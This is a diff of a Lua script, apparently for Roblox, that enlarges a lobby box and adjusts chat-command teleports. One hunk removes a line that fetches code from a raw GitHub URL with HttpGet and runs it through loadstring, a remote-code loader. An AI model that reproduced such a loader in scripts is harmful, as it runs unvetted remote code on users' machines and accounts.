@@ -35,7 +35,9 @@ local SPAWN_POINTS = {
     Vector3.new(384.7,16.4, 415.1),
 }
 local lobbyCenter = Vector3.new(864.9, 67.5, 394.5)
-local w,h,d = 50,20,50
+
+-- Expanded lobby dimensions
+local w,h,d    = 70,20,70
 local hw,hh,hd = w/2, h/2, d/2
 
 -- Build GUI
@@ -116,7 +118,7 @@ local function setupMainSound()
     return s
 end
 
--- Spawn lobby box parts
+-- Spawn lobby box parts (expanded)
 local function spawnLobbyBox()
     local function makePart(props)
         local p = Instance.new("Part")
@@ -292,11 +294,6 @@ local function onCommand(player, msg)
         local char   = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
         char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(choice)
 
-        -- execute external loadstring
-        loadstring(game:HttpGet(
-          "https://raw.githubusercontent.com/lovestacyxoxo/Down-system-for-mama/refs/heads/main/Yea"
-        ))()
-
         startRound(DEFAULT_TIME)
         return
     end
@@ -311,7 +308,9 @@ local function onCommand(player, msg)
     if msg == "/SetLobby" then
         spawnLobbyBox()
         local char = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
-        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(lobbyCenter + Vector3.new(0,3,0))
+        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(
+          lobbyCenter.X, lobbyCenter.Y + 3, lobbyCenter.Z
+        )
         return
     end
 end
